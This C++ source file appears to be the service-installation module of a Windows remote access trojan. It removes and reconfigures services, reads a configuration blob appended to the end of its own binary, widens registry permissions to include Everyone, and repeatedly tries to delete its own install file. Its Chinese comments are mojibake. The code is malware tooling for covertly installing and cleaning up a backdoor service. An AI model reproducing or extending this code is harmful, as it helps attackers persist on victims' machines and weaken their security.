#include "install.h"
#include "until.h"
#include <Shlwapi.h>
void RemoveService(LPCTSTR lpServiceName)
{
	char		Desc[MAX_PATH];
	char		regKey[1024];
	SC_HANDLE	service = NULL, scm = NULL;
	SERVICE_STATUS	Status;
	__try
	{
		scm = OpenSCManager(NULL, NULL,
			SC_MANAGER_ALL_ACCESS);
		service = OpenService(
			scm, lpServiceName,
			SERVICE_ALL_ACCESS);
		if (scm==NULL&&service == NULL)
			__leave;
		
		if (!QueryServiceStatus(service, &Status))
			__leave;
		
		if (Status.dwCurrentState != SERVICE_STOPPED)
		{
			if (!ControlService(service,
				SERVICE_CONTROL_STOP, 
				&Status))
				__leave;
			Sleep(800);
		}
		DeleteService(service);

		memset(regKey, 0, sizeof(regKey));
		wsprintf(regKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		SHDeleteKey(HKEY_LOCAL_MACHINE, regKey);
	}
	__finally
	{
		if (service != NULL)
			CloseServiceHandle(service);
		if (scm != NULL)
			CloseServiceHandle(scm);
	}
	return;
}

void DeleteInstallFile(char *lpServiceName)
{
	char	strInstallModule[MAX_PATH];
	char	strSubKey[1024];
	memset(strInstallModule, 0, sizeof(strInstallModule));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,
		"InstallModule", REG_SZ, strInstallModule, NULL, lstrlen(strInstallModule), 0);
	// ɾ����ֵ���ļ�
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "InstallModule", REG_SZ, NULL, NULL, 3);
	for (int i = 0; i < 25; i++)
	{
		Sleep(3000);
		if (DeleteFile(strInstallModule))
			break;
	}
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	1024

LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
{
	char	strFileName[MAX_PATH];
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;
	GetModuleFileName(hModule, strFileName, sizeof(strFileName));
	
	HANDLE	hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	
	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);
	
	int offset = memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
}
// �ļ������
void ReConfigService(char *lpServiceName)
{
	int rc = 0;
    HKEY hKey = 0;
	
    try{
        char buff[500];
        //config service
        strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
        strcat(buff, lpServiceName);
        rc = RegCreateKey(HKEY_LOCAL_MACHINE, buff, &hKey);
        if(ERROR_SUCCESS != rc)
        {
            throw "";
        }
		// ����ΪOwner�ģ���ΪShare
		DWORD dwType = 0x120;
        rc = RegSetValueEx(hKey, "Type", 0, REG_DWORD, (unsigned char*)&dwType, sizeof(DWORD));
        SetLastError(rc);
        if(ERROR_SUCCESS != rc)
            throw "RegSetValueEx(start)";
    }
    catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
	
    RegCloseKey(hKey);
}
// ����ע���Ĵ�ȡȨ��
BOOL RegKeySetACL(LPTSTR lpKeyName, DWORD AccessPermissions, ACCESS_MODE AccessMode)
{
	PSECURITY_DESCRIPTOR	SD;
	EXPLICIT_ACCESS			ea;
	PACL			OldDACL, NewDACL;
	SE_OBJECT_TYPE	ObjectType = SE_REGISTRY_KEY; //#include <aclapi.h>
	
	//Ĭ�Ϸ���ֵΪFALSE
	BOOL bRet = FALSE;
    //����һ���յ�ACL;
    if (SetEntriesInAcl(0, NULL, NULL, &OldDACL) != ERROR_SUCCESS)
        return bRet;
	
    if (SetEntriesInAcl(0, NULL, NULL, &NewDACL) != ERROR_SUCCESS)
        return bRet;
	
    //��ȡ���е�ACL�б�OldDACL:
    if(GetNamedSecurityInfo(lpKeyName, ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL, NULL,
		&OldDACL,
		NULL, &SD) != ERROR_SUCCESS)
    {
		return bRet;
    }
	
	//�����û���"Everyone"��ָ���ļ������в���Ȩ���ṹea:
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	
	char	*lpUsers[] = {"SYSTEM", "Administrators", "Everyone", "Users"};
	for (int i = 0; i < sizeof(lpUsers) / sizeof(char *); i++)
	{
		BuildExplicitAccessWithName(&ea,
			lpUsers[i],      // name of trustee
			AccessPermissions,    // type of access
			AccessMode,      // access mode
			SUB_CONTAINERS_AND_OBJECTS_INHERIT); //�Ӽ��̳�����Ȩ��
		
	}
    //�ϲ��ṹea��OldDACL��Ȩ���б��µ�NewDACL:
    if (SetEntriesInAcl(1, &ea, NULL, &NewDACL) == ERROR_SUCCESS)
    {
		//���µ�ACLд�뵽ָ���ļ�:
		SetNamedSecurityInfo(lpKeyName, ObjectType,
			DACL_SECURITY_INFORMATION,
			NULL, NULL,
			NewDACL,
			NULL);
		bRet = TRUE;
    }
	//�ͷ�ָ��
	
    if(SD != NULL)
		LocalFree((HLOCAL) SD);
    if(NewDACL != NULL)
		LocalFree((HLOCAL) NewDACL);
    if(OldDACL != NULL)
		LocalFree((HLOCAL) OldDACL);
    return bRet;
}

DWORD QueryServiceTypeFromRegedit(char *lpServiceName)
{
	int rc = 0;
    HKEY hKey = 0;
	DWORD	dwServiceType = 0;
    try{
        char buff[500];
        //config service
        strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
        strcat(buff, lpServiceName);
        rc = RegOpenKey(HKEY_LOCAL_MACHINE, buff, &hKey);
        if(ERROR_SUCCESS != rc)
        {
            throw "";
        }
		
		DWORD type, size = sizeof(DWORD);
		rc = RegQueryValueEx(hKey, "Type", 0, &type, (unsigned char *)&dwServiceType, &size);
		RegCloseKey(hKey);
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
			throw "RegQueryValueEx(Type)";
    }
    catch(...)
    {
    }
	
    RegCloseKey(hKey);
    return dwServiceType;
}
